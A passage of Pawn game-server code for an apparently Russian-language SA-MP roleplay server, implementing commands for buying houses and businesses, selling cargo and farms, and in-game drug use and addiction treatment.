	if((PlayerToPoint(30, playerid,HouseInfo[bouse][hExitx],HouseInfo[bouse][hExity],HouseInfo[bouse][hExitz]) && GetPlayerVirtualWorld(playerid) == bouse+50) || GetPVarInt(playerid, "BuyInt") != 0)
	{
		if(HouseInfo[PlayerInfo[playerid][pPHouseKey]][hKlass] == 0) ShowPlayerDialogEx(playerid, 195, DIALOG_STYLE_LIST, "Список интерьеров", "N-I\nN-II\nN-III\nN-IV\nN-V\nN-VI\nN-VII", "Осмотреть", "Отмена");
		if(HouseInfo[PlayerInfo[playerid][pPHouseKey]][hKlass] == 1) ShowPlayerDialogEx(playerid, 20, DIALOG_STYLE_LIST, "Список интерьеров", "D-I\nD-II\nD-III\nD-IV\nD-V\nD-VI\nD-VII", "Осмотреть", "Отмена");
		if(HouseInfo[PlayerInfo[playerid][pPHouseKey]][hKlass] == 2) ShowPlayerDialogEx(playerid, 185, DIALOG_STYLE_LIST, "Список интерьеров", "C-I\nC-II\nC-III\nC-IV\nC-V\nC-VI\nC-VII\nC-VIII\nC-IX", "Осмотреть", "Отмена");
		if(HouseInfo[PlayerInfo[playerid][pPHouseKey]][hKlass] == 3) ShowPlayerDialogEx(playerid, 175, DIALOG_STYLE_LIST, "Список интерьеров", "B-I\nB-II\nB-III\nB-IV\nB-V", "Осмотреть", "Отмена");
		if(HouseInfo[PlayerInfo[playerid][pPHouseKey]][hKlass] == 4 || HouseInfo[PlayerInfo[playerid][pPHouseKey]][hKlass] == 5) ShowPlayerDialogEx(playerid, 165, DIALOG_STYLE_LIST, "Список интерьеров", "A-I\nA-II\nA-III\nA-IV\nA-V", "Осмотреть", "Отмена");
	}
	else return SCM(playerid, COLOR_GREY, " Нужно находиться внутри дома. (Нужно находиться возле выхода)");
	if(GetPVarInt(playerid, "BuyInt") == 1) ShowPlayerDialogEx(playerid, 22, DIALOG_STYLE_LIST,"Покупка интерьера","Купить 200 000 вирт", "Принять", "Отмена");
	if(GetPVarInt(playerid, "BuyInt") == 2) ShowPlayerDialogEx(playerid, 23, DIALOG_STYLE_LIST,"Покупка интерьера","Купить 200 000 вирт", "Принять", "Отмена");
	if(GetPVarInt(playerid, "BuyInt") == 3) ShowPlayerDialogEx(playerid, 24, DIALOG_STYLE_LIST,"Покупка интерьера","Купить 200 000 вирт", "Принять", "Отмена");
	if(GetPVarInt(playerid, "BuyInt") == 4) ShowPlayerDialogEx(playerid, 25, DIALOG_STYLE_LIST,"Покупка интерьера","Купить 200 000 вирт", "Принять", "Отмена");
	if(GetPVarInt(playerid, "BuyInt") == 5) ShowPlayerDialogEx(playerid, 26, DIALOG_STYLE_LIST,"Покупка интерьера","Купить 200 000 вирт", "Принять", "Отмена");
	if(GetPVarInt(playerid, "BuyInt") == 6) ShowPlayerDialogEx(playerid, 27, DIALOG_STYLE_LIST,"Покупка интерьера","Купить 200 000 вирт", "Принять", "Отмена");
	if(GetPVarInt(playerid, "BuyInt") == 7) ShowPlayerDialogEx(playerid, 28, DIALOG_STYLE_LIST,"Покупка интерьера","Купить 200 000 вирт", "Принять", "Отмена");
	if(GetPVarInt(playerid, "BuyInt") == 41) ShowPlayerDialogEx(playerid, 41, DIALOG_STYLE_LIST,"Покупка интерьера","Купить 500 000 вирт", "Принять", "Отмена");
	if(GetPVarInt(playerid, "BuyInt") == 42) ShowPlayerDialogEx(playerid, 42, DIALOG_STYLE_LIST,"Покупка интерьера","Купить 500 000 вирт", "Принять", "Отмена");
	if(GetPVarInt(playerid, "BuyInt") == 43) ShowPlayerDialogEx(playerid, 43, DIALOG_STYLE_LIST,"Покупка интерьера","Купить 500 000 вирт", "Принять", "Отмена");
	if(GetPVarInt(playerid, "BuyInt") == 44) ShowPlayerDialogEx(playerid, 44, DIALOG_STYLE_LIST,"Покупка интерьера","Купить 500 000 вирт", "Принять", "Отмена");
	if(GetPVarInt(playerid, "BuyInt") == 45) ShowPlayerDialogEx(playerid, 45, DIALOG_STYLE_LIST,"Покупка интерьера","Купить 500 000 вирт", "Принять", "Отмена");
	if(GetPVarInt(playerid, "BuyInt") == 71) ShowPlayerDialogEx(playerid, 71, DIALOG_STYLE_LIST,"Покупка интерьера","Купить 400 000 вирт", "Принять", "Отмена");
	if(GetPVarInt(playerid, "BuyInt") == 72) ShowPlayerDialogEx(playerid, 72, DIALOG_STYLE_LIST,"Покупка интерьера","Купить 400 000 вирт", "Принять", "Отмена");
	if(GetPVarInt(playerid, "BuyInt") == 73) ShowPlayerDialogEx(playerid, 73, DIALOG_STYLE_LIST,"Покупка интерьера","Купить 400 000 вирт", "Принять", "Отмена");
	if(GetPVarInt(playerid, "BuyInt") == 74) ShowPlayerDialogEx(playerid, 74, DIALOG_STYLE_LIST,"Покупка интерьера","Купить 400 000 вирт", "Принять", "Отмена");
	if(GetPVarInt(playerid, "BuyInt") == 75) ShowPlayerDialogEx(playerid, 75, DIALOG_STYLE_LIST,"Покупка интерьера","Купить 400 000 вирт", "Принять", "Отмена");
	if(GetPVarInt(playerid, "BuyInt") == 81) ShowPlayerDialogEx(playerid, 81, DIALOG_STYLE_LIST,"Покупка интерьера","Купить 300 000 вирт", "Принять", "Отмена");
	if(GetPVarInt(playerid, "BuyInt") == 82) ShowPlayerDialogEx(playerid, 82, DIALOG_STYLE_LIST,"Покупка интерьера","Купить 300 000 вирт", "Принять", "Отмена");
	if(GetPVarInt(playerid, "BuyInt") == 83) ShowPlayerDialogEx(playerid, 83, DIALOG_STYLE_LIST,"Покупка интерьера","Купить 300 000 вирт", "Принять", "Отмена");
	if(GetPVarInt(playerid, "BuyInt") == 84) ShowPlayerDialogEx(playerid, 84, DIALOG_STYLE_LIST,"Покупка интерьера","Купить 300 000 вирт", "Принять", "Отмена");
	if(GetPVarInt(playerid, "BuyInt") == 85) ShowPlayerDialogEx(playerid, 85, DIALOG_STYLE_LIST,"Покупка интерьера","Купить 300 000 вирт", "Принять", "Отмена");
	if(GetPVarInt(playerid, "BuyInt") == 86) ShowPlayerDialogEx(playerid, 86, DIALOG_STYLE_LIST,"Покупка интерьера","Купить 300 000 вирт", "Принять", "Отмена");
	if(GetPVarInt(playerid, "BuyInt") == 87) ShowPlayerDialogEx(playerid, 87, DIALOG_STYLE_LIST,"Покупка интерьера","Купить 300 000 вирт", "Принять", "Отмена");
	if(GetPVarInt(playerid, "BuyInt") == 88) ShowPlayerDialogEx(playerid, 88, DIALOG_STYLE_LIST,"Покупка интерьера","Купить 300 000 вирт", "Принять", "Отмена");
	if(GetPVarInt(playerid, "BuyInt") == 89) ShowPlayerDialogEx(playerid, 89, DIALOG_STYLE_LIST,"Покупка интерьера","Купить 300 000 вирт", "Принять", "Отмена");
	if(GetPVarInt(playerid, "BuyInt") == 91) ShowPlayerDialogEx(playerid, 91, DIALOG_STYLE_LIST,"Покупка интерьера","Купить 100 000 вирт", "Принять", "Отмена");
	if(GetPVarInt(playerid, "BuyInt") == 92) ShowPlayerDialogEx(playerid, 92, DIALOG_STYLE_LIST,"Покупка интерьера","Купить 100 000 вирт", "Принять", "Отмена");
	if(GetPVarInt(playerid, "BuyInt") == 93) ShowPlayerDialogEx(playerid, 93, DIALOG_STYLE_LIST,"Покупка интерьера","Купить 100 000 вирт", "Принять", "Отмена");
	if(GetPVarInt(playerid, "BuyInt") == 94) ShowPlayerDialogEx(playerid, 94, DIALOG_STYLE_LIST,"Покупка интерьера","Купить 100 000 вирт", "Принять", "Отмена");
	if(GetPVarInt(playerid, "BuyInt") == 95) ShowPlayerDialogEx(playerid, 95, DIALOG_STYLE_LIST,"Покупка интерьера","Купить 100 000 вирт", "Принять", "Отмена");
	if(GetPVarInt(playerid, "BuyInt") == 96) ShowPlayerDialogEx(playerid, 96, DIALOG_STYLE_LIST,"Покупка интерьера","Купить 100 000 вирт", "Принять", "Отмена");
	if(GetPVarInt(playerid, "BuyInt") == 97) ShowPlayerDialogEx(playerid, 97, DIALOG_STYLE_LIST,"Покупка интерьера","Купить 100 000 вирт", "Принять", "Отмена");
	return true;
}
CMD:buyhouse(playerid, params[])
{
	if(!IsPlayerConnected(playerid)) return true;
	for(new h = 1; h <= TotalHouse; h++)
	{
		if((PlayerToPoint(2.0, playerid, HouseInfo[h][hEntrancex], HouseInfo[h][hEntrancey], HouseInfo[h][hEntrancez]) || (PlayerToPoint(2.0, playerid, HouseInfo[h][hExitx], HouseInfo[h][hExity], HouseInfo[h][hExitz]) && GetPlayerVirtualWorld(playerid) == h+50))
				&& strcmp(HouseInfo[h][hOwner],"None",true) == 0)
		{
			if(HGet(playerid)) return SCM(playerid, -1, " У вас уже есть дом!");
			if(KGet(playerid)) return SCM(playerid,COLOR_GREY," Для начала продайте квартиру");
			if(PlayerInfo[playerid][pBank] < HouseInfo[h][hValue]) return SCM(playerid,COLOR_GREY," Недостаточно денег для покупки! Пополните счет в банке!");
			if(HouseInfo[h][hValue] == 0) return SCM(playerid,COLOR_GREY," Этот дом нельзя купить!");
			HouseInfo[h][hHel] = 0;
			HouseInfo[h][hLock] = 1;
			strmid(HouseInfo[h][hOwner],PlayerInfo[playerid][pName], 0, strlen(PlayerInfo[playerid][pName]), 32);
			HGet(playerid);
			PlayerInfo[playerid][pBank] -= HouseInfo[h][hValue];
			SetPlayerInterior(playerid,HouseInfo[h][hInt]);
			SetPlayerPos(playerid,HouseInfo[h][hExitx],HouseInfo[h][hExity],HouseInfo[h][hExitz]);
			SetPlayerVirtualWorld(playerid,h+50);
			HouseInfo[h][hTakings] = GetHouseOplata(h);
			SCM(playerid, -1, " Поздравляем с покупкой!");
			format(YCMDstr, sizeof(YCMDstr), " Внимание! Теперь каждый час со счёта вашего дома будут снимать комунальные платежи, в размере %i вирт",GetHouseOplata(h));
			SCM(playerid, COLOR_YELLOW,YCMDstr);
			SCM(playerid, COLOR_YELLOW, " Если на счету недостаточно денег, вас выселят");
			SCM(playerid, COLOR_YELLOW, " Пополнить домашний счёт или узнать баланс можно через банк/банкомат");
			GameTextForPlayer(playerid,"~w~welcome home~n~print:~g~/exit", 5000, 3);
			new house = PlayerInfo[playerid][pPHouseKey];
			if(house_car[playerid] != -1)
			{
				DestroyVehicle(house_car[playerid]);
				house_car[playerid] = -1;
			}
			mysql_format(DATABASE, QUERY, sizeof(QUERY), "UPDATE `"TABLE_HOUSE"` SET hHel = '%i', hLock = '%i', hTakings = '%i' WHERE hOwner = '%e'", HouseInfo[h][hHel], HouseInfo[h][hLock], GetHouseOplata(h), HouseInfo[h][hOwner]);
			mysql_function_query(DATABASE,QUERY,false,"","");
			
			mysql_format(DATABASE, QUERY, sizeof(QUERY), "UPDATE `"TABLE_ACCOUNTS"` SET pBank = '%i' WHERE name = '%e'", PlayerInfo[playerid][pBank], PlayerInfo[playerid][pName]);
			mysql_function_query(DATABASE,QUERY,false,"","");
			
			mysql_format(DATABASE,QUERY,256,"SELECT * FROM `"TABLE_CARS"` WHERE `owner` = '%s'",PlayerInfo[playerid][pName]);
			mysql_function_query(DATABASE,QUERY,true,"OnMySQL_QUERY","iis",33,playerid,"");
			BuyHouse(house);
			SaveMySQL(5,house);
			PlayerInfo[playerid][pSpawnChange][0] = 0;
			printf("Игрок %s купил дом %i", Name(playerid), h);
			return true;
		}
	}
	return true;
}
CMD:sellprodsone(playerid, params[])
{
	for(new bizz = 1; bizz <= TotalBizz; bizz++)
	{
		if(PlayerToPoint(5.0, playerid, BizzInfo[bizz][bEntranceX], BizzInfo[bizz][bEntranceY], BizzInfo[bizz][bEntranceZ]) && BizzInfo[bizz][bType] == 1)
		{
			new newcar = GetPlayerVehicleID(playerid);
			if(newcar >= comptruck[4] && newcar <= comptruck[9])
			{
				if(strcmp(BizzInfo[bizz][bOwner],"None",true) == 0) return SCM(playerid,COLOR_GREY," У бизнеса нет владельца");
				SetPVarInt(playerid, "bizz", bizz);
				format(string,256,"Вы собираетесь продать продукты\n\n{15B5B8}Бизнес: %s\n{FFD500}Количество: %d\n{E51212}Стоимость: %d вирт",BizzInfo[bizz][bMessage],car_prods[GetPlayerVehicleID(playerid)][3],car_prods[GetPlayerVehicleID(playerid)][3]*16);
				return ShowPlayerDialogEx(playerid,1387,DIALOG_STYLE_MSGBOX,"Продажа продуктов",string,"Продать","Отмена");
			}
			else return SCM(playerid,COLOR_GREY," Нужно быть в транспортном средстве, которое может перевозить данный тип груза");
		}
	}
	return true;
}
CMD:sellprodstwo(playerid, params[])
{
	for(new bizz = 1; bizz <= TotalBizz; bizz++)
	{
		if(PlayerToPoint(5.0, playerid, BizzInfo[bizz][bEntranceX], BizzInfo[bizz][bEntranceY], BizzInfo[bizz][bEntranceZ]) && BizzInfo[bizz][bType] == 2)
		{
			new newcar = GetPlayerVehicleID(playerid);
			if(newcar >= comptruck[4] && newcar <= comptruck[9])
			{
				if(strcmp(BizzInfo[bizz][bOwner],"None",true) == 0) return SCM(playerid,COLOR_GREY," У бизнеса нет владельца");
				SetPVarInt(playerid, "bizz", bizz);
				format(string,256,"Вы собираетесь продать продукты\n\n{15B5B8}Бизнес: %s\n{FFD500}Количество: %d\n{E51212}Стоимость: %d вирт",BizzInfo[bizz][bMessage],car_prods[GetPlayerVehicleID(playerid)][3],car_prods[GetPlayerVehicleID(playerid)][3]*16);
				return ShowPlayerDialogEx(playerid,1388,DIALOG_STYLE_MSGBOX,"Продажа продуктов",string,"Продать","Отмена");
			}
			else return SCM(playerid,COLOR_GREY," Нужно быть в транспортном средстве, которое может перевозить данный тип груза");
		}
	}
	return true;
}
CMD:sellprodsthree(playerid, params[])
{
	for(new bizz = 1; bizz <= TotalBizz; bizz++)
	{
		if(PlayerToPoint(5.0, playerid, BizzInfo[bizz][bEntranceX], BizzInfo[bizz][bEntranceY], BizzInfo[bizz][bEntranceZ]) && BizzInfo[bizz][bType] == 3)
		{
			new newcar = GetPlayerVehicleID(playerid);
			if(newcar >= comptruck[4] && newcar <= comptruck[9])
			{
				if(strcmp(BizzInfo[bizz][bOwner],"None",true) == 0) return SCM(playerid,COLOR_GREY," У бизнеса нет владельца");
				SetPVarInt(playerid, "bizz", bizz);
				format(string,256,"Вы собираетесь продать Товары\n\n{15B5B8}Бизнес: %s\n{FFD500}Количество: %d\n{E51212}Стоимость: %d вирт",BizzInfo[bizz][bMessage],car_prods[GetPlayerVehicleID(playerid)][2],car_prods[GetPlayerVehicleID(playerid)][2]*16);
				return ShowPlayerDialogEx(playerid,1389,DIALOG_STYLE_MSGBOX,"Продажа продуктов",string,"Продать","Отмена");
			}
			else return SCM(playerid,COLOR_GREY," Нужно быть в транспортном средстве, которое может перевозить данный тип груза");
		}
	}
	return true;
}
CMD:sellprodsfour(playerid, params[])
{
	for(new bizz = 1; bizz <= TotalBizz; bizz++)
	{
		if(PlayerToPoint(5.0, playerid, BizzInfo[bizz][bEntranceX], BizzInfo[bizz][bEntranceY], BizzInfo[bizz][bEntranceZ]) && BizzInfo[bizz][bType] == 4)
		{
			new newcar = GetPlayerVehicleID(playerid);
			if(newcar >= comptruck[2] && newcar <= comptruck[3])
			{
				if(strcmp(BizzInfo[bizz][bOwner],"None",true) == 0) return SCM(playerid,COLOR_GREY," У бизнеса нет владельца");
				SetPVarInt(playerid, "bizz", bizz);
				format(string,256,"Вы собираетесь продать топливо\n\n{15B5B8}Бизнес: %s\n{FFD500}Количество: %d\n{E51212}Стоимость: %d вирт",BizzInfo[bizz][bMessage],car_prods[GetPlayerVehicleID(playerid)][1],car_prods[GetPlayerVehicleID(playerid)][1]*16);
				return ShowPlayerDialogEx(playerid,1390,DIALOG_STYLE_MSGBOX,"Продажа продуктов",string,"Продать","Отмена");
			}
			else return SCM(playerid,COLOR_GREY," Нужно быть в транспортном средстве, которое может перевозить данный тип груза");
		}
	}
	return true;
}
/*CMD:buybiz(playerid, params[])
{
	new sstring[10];
	if(!IsPlayerConnected(playerid)) return true;
	if(BGet(playerid))  return SCM(playerid, -1, " У вас уже есть бизнес, введите /sellbiz чтобы его продать.");
	for(new bizz = 1; bizz <= TotalBizz; bizz++)
	{
		if(PlayerToPoint(5.0, playerid, BizzInfo[bizz][bEntranceX], BizzInfo[bizz][bEntranceY], BizzInfo[bizz][bEntranceZ]) && strcmp(BizzInfo[bizz][bOwner],"None",true) == 0)
		{
			bizselect[playerid] = bizz;
			if(BizzInfo[bizselect[playerid]][bLastStavka] == 0) format(sstring,9,"%i",BizzInfo[bizselect[playerid]][bStavka]);
			else format(sstring,32,"Скрыта");
			format(YCMDstr,sizeof(YCMDstr),"{FFFF00}Бизнес: %s.\n{ffffff}Предыдущая ставка: %i\n{ffffff}Текущая ставка: %s\n{33AA33}Сделать ставку",BizzInfo[bizselect[playerid]][bMessage],BizzInfo[bizselect[playerid]][bLastStavka],BizzInfo[bizselect[playerid]][bStavka], sstring);
			ShowPlayerDialogEx(playerid,1668,DIALOG_STYLE_LIST,"Аукцион",YCMDstr, "Далее", "Отмена");
			return true;
		}
	}
	return true;
}*/

CMD:buybiz(playerid, params[])
{
	new stringg[256];
	if(!IsPlayerConnected(playerid)) return true;
	if(BGet(playerid))  return SCM(playerid, -1, " У вас уже есть бизнес, введите /sellbiz чтобы его продать.");
	for(new bizz = 1; bizz <= TotalBizz; bizz++)
	{
		if(PlayerToPoint(5.0, playerid, BizzInfo[bizz][bEntranceX], BizzInfo[bizz][bEntranceY], BizzInfo[bizz][bEntranceZ]) && strcmp(BizzInfo[bizz][bOwner],"None",true) == 0)
		{
		    bizselect[playerid] = bizz;
			format(stringg, sizeof(string), "\
			{FFFFFF}Название бизнеса: %s\n\
			{FFFFFF}Статус бизнеса: %s\n\
			{FFFFFF}Номер бизнеса: #%d\n\
			{FFFFFF}Цена бизнеса: $%d", BizzInfo[bizz][bMessage],(BizzInfo[bizz][bLocked]) ? ("Открыт") : ("Закрыт"), bizselect[playerid], BizzInfo[bizz][bBuyPrice]);
			ShowPlayerDialogEx(playerid, 1668, DIALOG_STYLE_MSGBOX, "Покупка бизнеса", stringg, "Купить", "Закрыть");
		}
	}
	return 1;
}
CMD:test1(playerid, params[])
{
	new stringg[40];
	format(stringg, sizeof(stringg), "Бизнес ваш: %d", bizselect[playerid]);
	SCM(playerid, -1, stringg);
	return 1;
}
CMD:buytune(playerid, params[])
{
	new str[10];
	if(!IsPlayerConnected(playerid)) return true;
	if(WGet(playerid))  return SCM(playerid, -1, " У вас уже есть автомастерская");
	for(new i = 1; i <= TOTALSHOPS; i++)
	{
		if(!PlayerToPoint(5.0, playerid, WorkshopInfo[i][wEntr][0], WorkshopInfo[i][wEntr][1], WorkshopInfo[i][wEntr][2]) || strcmp(WorkshopInfo[i][wOwner],"None",true) != 0) continue;
		bizselect[playerid] = i;
		if(WorkshopInfo[bizselect[playerid]][wAuction][1] == 0) format(str,9,"%i",WorkshopInfo[bizselect[playerid]][wAuction][0]);
		else format(str,16,"Скрыта");
		format(YCMDstr,sizeof(YCMDstr),"{FFFF00}Бизнес: СТО [%i].\n{ffffff}Предыдущая ставка: %i\n{ffffff}Текущая ставка: %s\n{33AA33}Сделать ставку",WorkshopInfo[bizselect[playerid]][wID]-1,WorkshopInfo[bizselect[playerid]][wAuction][2],WorkshopInfo[bizselect[playerid]][wAuction][1], str);
		ShowPlayerDialogEx(playerid,1691,DIALOG_STYLE_LIST,"Аукцион бизнесов",YCMDstr, "Далее", "Отмена");
		break;
	}
	return true;
}
CMD:buyfarm(playerid, params[])
{
	new str[10];
	if(!IsPlayerConnected(playerid)) return true;
	if(FGet(playerid))  return SCM(playerid, -1, " У вас уже есть ферма");
	for(new i = 1; i <= TOTALFARM; i++)
	{
		if(!PlayerToPoint(10.0, playerid, FarmInfo[i][fMenu][0], FarmInfo[i][fMenu][1], FarmInfo[i][fMenu][2]) || strcmp(FarmInfo[i][fOwner],"None",true) != 0) continue;
		bizselect[playerid] = i;
		if(FarmInfo[bizselect[playerid]][fAuction][1] == 0) format(str,9,"%i",FarmInfo[bizselect[playerid]][fAuction][0]);
		else format(str,16,"Скрыта");
		format(YCMDstr,sizeof(YCMDstr),"{FFFF00}Бизнес: Ферма [%i].\n{ffffff}Предыдущая ставка: %i\n{ffffff}Текущая ставка: %s\n{33AA33}Сделать ставку",FarmInfo[bizselect[playerid]][fID]-1,FarmInfo[bizselect[playerid]][fAuction][2],FarmInfo[bizselect[playerid]][fAuction][1], str);
		ShowPlayerDialogEx(playerid,1693,DIALOG_STYLE_LIST,"Аукцион бизнесов",YCMDstr, "Далее", "Отмена");
		break;
	}
	return true;
}
CMD:selltune(playerid, params[])
{
	if(!WGet(playerid)) return SCM(playerid,-1," {B8B8B8} Вы не владеете Автомастерской");
	new i = GetPVarInt(playerid,"wShop");
	if(!PlayerToPoint(5.0, playerid, WorkshopInfo[i][wEntr][0], WorkshopInfo[i][wEntr][1], WorkshopInfo[i][wEntr][2])) return SCM(playerid,COLOR_GREY," Необходимо находиться возле автомастерской!");
	PlayerInfo[playerid][pBank] += WorkshopInfo[i][wBank]+WorkshopInfo[i][wLandTax];
	format(string,40,"~w~workshop in sold~n~~g~$%i",WorkshopInfo[i][wBank]+WorkshopInfo[i][wLandTax]);
	GameTextForPlayer(playerid,string, 5000, 3);
	strmid(WorkshopInfo[i][wOwner],"None",0,strlen("None"),MAX_PLAYER_NAME);
	strmid(WorkshopInfo[i][wDeputy1],"None",0,strlen("None"),MAX_PLAYER_NAME);
	strmid(WorkshopInfo[i][wDeputy2],"None",0,strlen("None"),MAX_PLAYER_NAME);
	strmid(WorkshopInfo[i][wDeputy3],"None",0,strlen("None"),MAX_PLAYER_NAME);
	strmid(WorkshopInfo[i][wMechanic1],"None",0,strlen("None"),MAX_PLAYER_NAME);
	strmid(WorkshopInfo[i][wMechanic2],"None",0,strlen("None"),MAX_PLAYER_NAME);
	strmid(WorkshopInfo[i][wMechanic3],"None",0,strlen("None"),MAX_PLAYER_NAME);
	strmid(WorkshopInfo[i][wMechanic4],"None",0,strlen("None"),MAX_PLAYER_NAME);
	strmid(WorkshopInfo[i][wMechanic5],"None",0,strlen("None"),MAX_PLAYER_NAME);
	WorkshopInfo[i][wAuction][0] = 0;
	WorkshopInfo[i][wAuction][1] = 0;
	WorkshopInfo[i][wAuction][2] = 0;
	WorkshopInfo[i][wAuction][3] = 0;
	WorkshopInfo[i][wAuction][4] = 0;
	WorkshopInfo[i][wLandTax] = 0;
	WorkshopInfo[i][wBank] = 0;
	WorkshopInfo[i][wProds] = 0;
	WorkshopInfo[i][wPriceProds] = 50;
	WorkshopInfo[i][wZp] = 5;
	DeletePVar(playerid,"wShop");
 	printf("Игрок %s продал СТО [ID: %i]", Name(playerid), i+1);
	return SendMes(playerid,0x4B00B0AA," Бизнес СТО [%i] выставлен на аукцион!",i-1);
}
CMD:sellfarm(playerid, params[])
{
	if(!FGet(playerid)) return SCM(playerid,COLOR_GREY," {B8B8B8} Вы не владеете фермой");
	new i = PlayerInfo[playerid][pPFarmKey];
	if(GetPVarInt(playerid,"farm_id") == i) return SCM(playerid,COLOR_GREY," Для начала переоденьтесь!");
	if(!PlayerToPoint(10.0, playerid, FarmInfo[i][fMenu][0], FarmInfo[i][fMenu][1], FarmInfo[i][fMenu][2])) return SCM(playerid,COLOR_GREY," Необходимо находиться возле фермы!");
	PlayerInfo[playerid][pBank] += FarmInfo[i][fBank]+FarmInfo[i][fLandTax];
	format(string,40,"~w~Farm it sold~n~~g~$%i",FarmInfo[i][fBank]+FarmInfo[i][fLandTax]);
	GameTextForPlayer(playerid,string, 5000, 3);
	strmid(FarmInfo[i][fOwner],"None",0,strlen("None"),MAX_PLAYER_NAME);
	strmid(FarmInfo[i][fDeputy_1],"None",0,strlen("None"),MAX_PLAYER_NAME);
	strmid(FarmInfo[i][fDeputy_2],"None",0,strlen("None"),MAX_PLAYER_NAME);
	strmid(FarmInfo[i][fDeputy_3],"None",0,strlen("None"),MAX_PLAYER_NAME);
	strmid(FarmInfo[i][fFarmer_1],"None",0,strlen("None"),MAX_PLAYER_NAME);
	strmid(FarmInfo[i][fFarmer_2],"None",0,strlen("None"),MAX_PLAYER_NAME);
	strmid(FarmInfo[i][fFarmer_3],"None",0,strlen("None"),MAX_PLAYER_NAME);
	strmid(FarmInfo[i][fFarmer_4],"None",0,strlen("None"),MAX_PLAYER_NAME);
	strmid(FarmInfo[i][fFarmer_5],"None",0,strlen("None"),MAX_PLAYER_NAME);
	FarmInfo[i][fAuction][0] = 0;
	FarmInfo[i][fAuction][1] = 0;
	FarmInfo[i][fAuction][2] = 0;
	FarmInfo[i][fAuction][3] = 0;
	FarmInfo[i][fAuction][4] = 0;
	FarmInfo[i][fLandTax] = 0;
	FarmInfo[i][fBank] = 0;
	FarmInfo[i][fProds] = 0;
	FarmInfo[i][fZp] = 30;
	FarmInfo[i][fGrain_Price] = 5;
	FarmInfo[i][fGrain] = 0;
	FarmInfo[i][fGrain_Sown] = 0;
	FarmInfo[i][fProds_Selling] = 1;
	FarmInfo[i][fProds_Price] = 21;
	PlayerInfo[playerid][pPFarmKey] = 999;
	printf("Игрок %s продал ферму [ID: %i]", Name(playerid), i-1);
	return SendMes(playerid,0x4B00B0AA," Бизнес Ферма [%i] выставлен на аукцион!",i-1);
}
CMD:healaddict(playerid, params[])
{
	if(!IsPlayerConnected(playerid)) return true;
	if(PlayerInfo[playerid][pMember] != 4 && PlayerInfo[playerid][pMember] != 22 && PlayerInfo[playerid][pMember] != 33) return SCM(playerid,COLOR_GREY," Вы не медик!");
	if(sscanf(params, "u", params[0]))  return SCM(playerid, -1, " Введите: /healaddict [id игрока]");
	if(!PlayerToPoint(40.0,playerid,366.9755,-60.1330,1076.4773) && !PlayerToPoint(40.0,playerid,366.9755,-60.1330,1076.4773)) return true;
	if(!IsPlayerConnected(params[0])) return true;
	if(params[0] == INVALID_PLAYER_ID) return true;
	if(seans[params[0]] == 1)return SCM(playerid,COLOR_GREEN, " Следущий сеанс можно провести через час");
	if(PlayerInfo[params[0]][pAddiction] <1000)return SCM(playerid,COLOR_GREEN, " У пациента меньше чем 1000 зависимости");
	if(params[0] == playerid)return SCM(playerid,COLOR_GRAD1, " [Ошибка] Вы указали свой ID");
	PlayerInfo[params[0]][pAddiction] -=500;
	format(YCMDstr,sizeof(YCMDstr), " Медик %s провёл с вами сеанс от наркозависимости",PlayerInfo[playerid][pName]);
	SCM(params[0],COLOR_GREEN,YCMDstr);
	format(YCMDstr,sizeof(YCMDstr), " Вы провели сеанс от наркозависимости с %s",Name(params[0]));
	SCM(playerid,COLOR_GREEN,YCMDstr);
	seans[params[0]] = 1;
	PlayerInfo[params[0]][pNarcoLomka] = 0;
	printf("Медик %s провёл сеанс от ломки %s", Name(playerid), Name(params[0]));
	return true;
}
CMD:usedrugs(playerid, params[])
{
	if(!PlayerInfo[playerid][pLogin]) return true;
	if(sscanf(params, "i", params[0]))
	{
		if(PlayerInfo[playerid][pAddiction] < 2000) params[0] = 3;
		else if(PlayerInfo[playerid][pAddiction] < 5000) params[0] = 10;
		else if(PlayerInfo[playerid][pAddiction] > 5000) params[0] = 15;
	}
	new Float:health;
	GetPlayerHealth(playerid, health);
	if(PlayerInfo[playerid][pDrugs] < params[0]) return SCM(playerid, COLOR_GREY," Недостаточно наркотиков");
	if(params[0] < 1) return SCM(playerid,COLOR_GREY," Неверное кол-во");
	if(PlayerInfo[playerid][pAddiction] < 2000 && params[0] > 3) return SCM(playerid,COLOR_GRAD1," Не более 3 грамм");
	else if(PlayerInfo[playerid][pAddiction] < 5000 && params[0] > 10) return SCM(playerid,COLOR_GRAD1," Не более 10 грамм");
	else if(params[0] > 15) return SCM(playerid,COLOR_GRAD1," Не более 15 грамм");
	if(PlayerInfo[playerid][pAddiction] < 2000 && health+ 10.0*params[0] > 120)
	{
		if(GetPVarInt(playerid,"drug_time") < gettime()) SCM(playerid,-1," (( Здоровье пополнено до: 120 ))"), SetPlayerHealthAC(playerid,120);
		else SCM(playerid,-1," (( Здоровье можно пополнить не чаще, чем раз в 1 минуту ))");
		SetPlayerTime(playerid,17,0);
		SetPlayerWeather(playerid, -67);
		SetTimerEx("AddictionTimer", 20000, false, "i", playerid);
	}
	else if(PlayerInfo[playerid][pAddiction] < 5000 && health+ 10.0*params[0] > 140)
	{
		if(GetPVarInt(playerid,"drug_time") < gettime()) SCM(playerid,-1," (( Здоровье пополнено до: 140 ))"), SetPlayerHealthAC(playerid,140);
		else SCM(playerid,-1," (( Здоровье можно пополнить не чаще, чем раз в 1 минуту ))");
	}
	else if(PlayerInfo[playerid][pAddiction] > 5000 && health+10.0*params[0] > 160)
	{
		if(GetPVarInt(playerid,"drug_time") < gettime()) SCM(playerid,-1," (( Здоровье пополнено до: 160 ))"), SetPlayerHealthAC(playerid,160);
		else SCM(playerid,-1," (( Здоровье можно пополнить не чаще, чем раз в 1 минуты ))");
	}
	else
	{
		if(GetPVarInt(playerid,"drug_time") < gettime()) SendMes(playerid,-1," (( Здоровье пополнено до: %.0f ))",health+10*params[0]), SetPlayerHealthAC(playerid, health + 10.0*params[0]);
		else SCM(playerid,-1," (( Здоровье можно пополнить не чаще, чем раз в 1 минуты ))");
		if(PlayerInfo[playerid][pAddiction] < 2000)
		{
			SetPlayerTime(playerid,17,0);
			SetPlayerWeather(playerid, -68);
			SetTimerEx("AddictionTimer", 10000, false, "i", playerid);
		}
	}
	PlayerInfo[playerid][pNarcoLomka] = 0;
	switch(booston)
	{
	case 0:SetPVarInt(playerid,"drug_time", gettime() + 60);
	case 1:SetPVarInt(playerid,"drug_time", gettime() + 39);
	}
	PlayerInfo[playerid][pDrugs] -= params[0];
	ApplyAnimation(playerid,"SMOKING","M_smk_drag",4.1,0,0,0,0,0,1);
	SetPlayerChatBubble(playerid,"Употребил(a) наркотик",COLOR_PURPLE,30.0,10000);
